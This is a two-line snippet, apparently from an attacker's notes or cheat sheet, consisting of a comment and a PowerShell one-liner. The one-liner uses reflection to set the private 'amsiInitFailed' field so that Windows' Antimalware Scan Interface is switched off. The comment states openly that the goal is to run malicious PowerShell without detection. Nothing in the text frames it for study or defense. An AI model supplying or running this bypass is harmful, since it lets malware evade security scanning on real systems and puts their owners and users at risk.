# Disables AMSI (Antimalware Scan Interface to execute malicious powershell safely

"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitfailed','NonPublic, Static').SetValue($null,$true)"